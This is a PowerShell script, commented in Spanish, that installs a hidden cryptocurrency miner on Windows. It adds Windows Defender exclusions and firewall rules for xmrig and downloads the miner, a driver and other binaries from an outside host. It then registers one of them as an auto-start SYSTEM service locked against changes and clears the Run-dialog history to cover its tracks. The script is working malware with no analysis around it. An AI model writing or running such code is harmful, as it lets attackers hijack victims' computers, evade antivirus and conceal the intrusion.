$baseURL = "https://baa4ts.is-a-good.dev"
$root = Join-Path $env:WINDIR "events"

# Crear carpeta si no existe
if (-not (Test-Path -Path $root)) {
    New-Item -Path $root -ItemType Directory -Force
}

# Definir rutas de archivos
$xmrig = Join-Path $root "xmrig.exe"
$Win2 = Join-Path $root "Win2Internals.exe"
$wroom = Join-Path $root "wroom.dll"
$WinRing = Join-Path $root "WinRing0x64.sys"

# Establecer variable de entorno (requiere ejecución como administrador)
try {
    [Environment]::SetEnvironmentVariable("WINUSERNAME", $env:USERNAME, "Machine")
}
catch {
    Write-Warning "No se pudo establecer la variable de entorno. Ejecutar como administrador."
}

# Agregar exclusiones de Windows Defender
try {
    Add-MpPreference -ExclusionPath $root -ErrorAction Stop
    Add-MpPreference -ExclusionProcess "xmrig.exe" -ErrorAction Stop
    Add-MpPreference -ExclusionProcess "Win2Internals.exe" -ErrorAction Stop
}
catch {
    Write-Warning "Error al agregar exclusiones. Verificar permisos de administrador."
}

# Reglas de firewall (requiere administrador)
try {
    New-NetFirewallRule -DisplayName "Entrada XMRIG" -Direction Inbound -Program $xmrig -Action Allow -Profile Any -ErrorAction Stop
    New-NetFirewallRule -DisplayName "Salida XMRIG" -Direction Outbound -Program $xmrig -Action Allow -Profile Any -ErrorAction Stop
}
catch {
    Write-Warning "Error al crear reglas de firewall. Verificar permisos."
}

# Descargar archivos
$files = @(
    "Win2Internals.exe",
    "WinRing0x64.sys",
    "wroom.dll",
    "xmrig.exe"
)

foreach ($file in $files) {
    $destination = Join-Path $root $file
    try {
        Invoke-WebRequest -Uri "$baseURL/$file" -OutFile $destination -ErrorAction Stop
        Write-Host "Descargado: $file"
    }
    catch {
        Write-Warning "Error al descargar $file"
    }
}

# Crear servicio (requiere administrador)
try {
    sc.exe create Win2Internals binPath= "$Win2" start= auto obj= "LocalSystem" type= own
    sc.exe sdset Win2Internals "D:(A;;GA;;;SY)"
}
catch {
    Write-Warning "Error al crear el servicio. Ejecutar como administrador."
}

# Limpiar registro
try {
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name * -Force -ErrorAction SilentlyContinue
}
catch {
    # Silenciar errores de registro
}
